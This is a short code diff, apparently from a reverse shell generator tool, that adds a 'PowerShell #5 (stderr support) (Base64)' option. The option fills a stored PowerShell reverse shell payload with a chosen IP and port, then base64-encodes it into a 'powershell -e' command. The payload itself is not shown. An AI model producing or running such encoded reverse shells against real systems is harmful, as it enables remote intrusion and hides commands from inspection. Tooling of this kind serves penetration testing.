@@ -10,7 +10,12 @@ const insertParameters = function (command, params) {
             .replace(encoder('{ip}'), encoder(params.ip))
             .replace(encoder('{port}'), encoder(String(params.port))))
     }
-
+    if (command === "PowerShell #5 (stderr support) (Base64)") {
+        return "powershell -e " + btoa(rsgData.specialCommands['PowerShell +stderr payload']
+            .replace(encoder('{ip}'), encoder(params.ip))
+            .replace(encoder('{port}'), encoder(String(params.port))))
+    }
+    
     return command
         .replace(encoder('{ip}'), encoder(params.ip))
         .replace(encoder('{port}'), encoder(String(params.port)))
